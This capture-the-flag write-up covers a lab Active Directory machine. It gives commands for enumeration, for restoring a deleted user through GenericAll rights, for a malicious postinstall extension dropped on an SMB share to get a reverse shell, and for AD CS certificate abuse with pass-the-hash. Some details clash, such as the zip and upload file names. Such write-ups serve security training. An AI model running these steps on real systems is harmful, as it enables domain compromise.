HTB — Checkpoint

📅 06/16/2026 · ⏱️ 2 min read · 🎯 Difficulty: Medium
HTBActive DirectoryWindowsAD CSSMBVSIX exploit

Checkpoint is an Active Directory machine that combines LDAP enumeration, abuse of delegated permissions, SMB, and a final escalation via Active Directory Certificate Services (AD CS). During the process, we will leverage excessive permissions on a deleted user to regain access to a privileged account and subsequently compromise the entire domain.

Reconnaissance

I started by performing a full port scan:

nmap -p- --min-rate 5000 10.129.16.196 -oN init.nmap

Next, I ran service detection and NSE scripts:

nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.16.196 -oN
services.nmap

The results clearly show that we are dealing with a Domain Controller.

53/tcp open dns 88/tcp open kerberos 389/tcp open ldap 445/tcp open microsoft-ds 5985/
tcp open winrm 9389/tcp open adws

Finding: the machine exposes multiple Active Directory services, including LDAP, Kerberos, SMB, and WinRM.

LDAP Enumeration

The machine provides the following initial credentials:

alex.turner : Checkpoint2024!

Using these, we perform a full domain enumeration via ldapdomaindump.

ldapdomaindump
-u checkpoint.local\alex.turner
-p 'Checkpoint2024!'
ldap://10.129.16.196

After reviewing the domain objects and their ACLs, we came across a very interesting finding.

Finding: the user alex.turner has GenericAll permissions over the user ryan.brooks.

Upon further review of the exported information, we observed that ryan.brooks is deleted within Active Directory.

Given that we have GenericAll permissions over this object, we proceed to restore the account and assign it a new password.

Once the account is recovered, we validate domain access using the new credentials.

SMB Enumeration

With the account restored, we begin enumerating shared resources.

smbclient -L //10.129.16.196 -U ryan.brooks

Among the available resources, we find one that is particularly interesting:

DevDrop

We access the resource:

smbclient //10.129.16.196/DevDrop -U ryan.brooks

Upon reviewing the existing files, we observed documentation and configurations related to an automated extension deployment system.

Finding: the ryan.brooks account has write permissions for DevDrop.

The service continuously monitors for new packages, extracts them, and automatically executes installation processes.

Gaining Initial Access

By analyzing the deployment mechanism, we discovered that extensions are simply compressed files that can include installation scripts.

One of the supported events is: 

"postinstall"

This allows us to execute arbitrary commands when the system processes the extension.

We create a malicious extension:


    { 
        "name": "checkpoint",
        "version": "1.0.0",
        "scripts": { "postinstall": "powershell -c <payload>" 
    } }

We package the content:

zip -r exploit.zip .

We set up a listener:

nc -lvnp 4444

And upload the extension to the shared resource:

put exploit.extension

After a few seconds, the automated process detects the package, executes the installation script, and we obtain a shell on the domain controller. 

type C:\Users\ryan.brooks\Desktop\user.txt

Privilege Escalation

With initial access, we proceed to enumerate the Active Directory environment using BloodHound and Certipy. 

certipy find
-u ryan.brooks
-p '<PASSWORD>'
-d checkpoint.local

The enumeration reveals a vulnerable template within Active Directory Certificate Services.

The template allows specifying a Subject Alternative Name (SAN), making it possible to request certificates for any user in the domain.

AD CS Abuse

We request a certificate for the Administrator account. 

certipy req
-u ryan.brooks
-p '<PASSWORD>'
-template <TEMPLATE>
-upn administrator@checkpoint.local

The result is:

administrator.pfx

We then use this certificate to authenticate and retrieve the administrator's NTLM hash.

certipy auth -pfx administrator.pfx

With the hash in hand, we perform a Pass-the-Hash attack using Evil-WinRM.

evil-winrm
-i 10.129.16.196
-u Administrator
-H <NTLM_HASH>

Full Compromise

Authentication is successful, and we obtain Domain Administrator privileges on the domain controller.

type C:\Users\max.palmer\Desktop\root.txt

Pwned: full domain compromise via restoration of a deleted user, SMB abuse, and AD CS exploitation.

Conclusion

Checkpoint demonstrates how poor permission delegation in Active Directory can lead to the complete compromise of an organization. The exploitation chain relies on recovering the deleted user ryan.brooks thanks to GenericAll permissions held by alex.turner, abusing the DevDrop share to achieve remote code execution, and finally, a critical privilege escalation using a vulnerable Active Directory Certificate Services template.
